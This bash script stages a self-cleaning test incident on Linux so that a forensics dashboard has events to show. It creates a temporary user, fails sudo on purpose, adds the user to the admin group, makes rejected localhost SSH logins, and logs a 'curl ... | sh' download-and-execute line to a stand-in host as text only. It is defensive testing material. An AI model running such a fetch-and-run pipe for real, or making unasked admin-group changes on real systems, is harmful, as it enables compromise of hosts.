#!/usr/bin/env bash
# Safe test incident - Linux.
#
# Generates genuine journal/auth-log events, then removes everything it made:
#   useradd                  -> User Account Created
#   sudo, wrong passwords    -> Sudo Authentication Failure (x3)
#   sudo by non-sudoer       -> Sudo Denied (Not in sudoers)
#   usermod -aG sudo|wheel   -> User Added to Admin Group
#   ssh as unknown users     -> SSH Failed Login (Invalid User)  [only if sshd runs]
#   logger text              -> Suspicious shell command pattern
#   userdel                  -> cleanup
#
# The account gets a random password that is never printed, and is deleted
# seconds later. Nothing is downloaded or
# executed: the "curl | sh" line is only written as log TEXT. Requires root.
# Each "STEP:" line is shown to the investigator in the dashboard.
set -uo pipefail
USER_NAME=forensics_demo

if id "$USER_NAME" &>/dev/null; then
  echo "ERROR: user $USER_NAME already exists; refusing to touch it."
  exit 2
fi

ADMIN_GROUP=sudo
getent group sudo >/dev/null || ADMIN_GROUP=wheel

cleanup() {
  userdel "$USER_NAME" 2>/dev/null
  if id "$USER_NAME" &>/dev/null; then
    echo "WARNING: could not delete $USER_NAME; remove it with: userdel $USER_NAME"
  else
    echo "STEP: Cleanup - deleted $USER_NAME"
  fi
}
trap cleanup EXIT

useradd -M -s /bin/sh "$USER_NAME" && echo "STEP: Created temporary user $USER_NAME (useradd)"

# Random password, never printed; only used to drive sudo below.
PW="$(head -c 18 /dev/urandom | base64 | tr -d '/+=')"
echo "$USER_NAME:$PW" | chpasswd

printf 'WrongPassword1\nWrongPassword2\nWrongPassword3\n' | runuser -u "$USER_NAME" -- sudo -S -k true &>/dev/null
echo "STEP: $USER_NAME failed sudo authentication 3 times (wrong passwords)"

printf '%s\n' "$PW" | runuser -u "$USER_NAME" -- sudo -S -k true &>/dev/null
echo "STEP: $USER_NAME tried sudo without being in sudoers (denied)"

usermod -aG "$ADMIN_GROUP" "$USER_NAME" && echo "STEP: Added $USER_NAME to '$ADMIN_GROUP'"

if systemctl is-active --quiet ssh 2>/dev/null || systemctl is-active --quiet sshd 2>/dev/null; then
  for i in 1 2 3 4 5; do
    ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        -o ConnectTimeout=3 "nosuchuser$i@127.0.0.1" true &>/dev/null
  done
  echo "STEP: 5 SSH logins to localhost for non-existent users (rejected)"
else
  echo "NOTE: sshd is not running, so the SSH failed-login step was skipped"
fi

logger -t forensics-demo "safe test indicator (text only, not executed): curl -s http://example.invalid/x.sh | sh"
echo "STEP: Logged a download-and-execute pattern as text only (nothing ran)"
